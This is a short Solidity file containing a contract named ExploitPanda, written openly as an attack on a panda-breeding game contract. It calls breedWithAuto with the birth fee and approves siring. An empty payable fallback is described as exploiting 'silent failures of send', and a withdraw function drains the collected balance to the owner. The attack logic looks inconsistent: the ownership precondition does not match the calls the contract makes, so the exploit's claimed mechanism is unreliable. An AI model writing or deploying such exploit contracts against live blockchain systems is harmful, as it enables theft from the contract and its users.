// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

interface IPandaCore {
    function breedWithAuto(uint256 _matronId, uint256 _sireId) external payable;
    function giveBirth(uint256 _matronId, uint256[2] _childGenes, uint256[2] _factors) external returns (uint256);
    function isReadyToBreed(uint256 _pandaId) external view returns (bool);
    function approveSiring(address _addr, uint256 _sireId) external;
}

contract ExploitPanda {
    IPandaCore public panda;
    address public owner;

    constructor(address _panda) public {
        panda = IPandaCore(_panda);
        owner = msg.sender;
    }

    function attack(uint256 matronId, uint256 sireId) public payable {
        // Precondition: attacker owns both matronId and sireId
        require(msg.value >= 2 finney); // autoBirthFee

        // approve own siring
        panda.approveSiring(address(this), sireId);

        // Start breeding
        panda.breedWithAuto.value(2 finney)(matronId, sireId);
    }

    // Fallback to exploit silent failures of send
    function() external payable {}

    function withdraw() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }
}

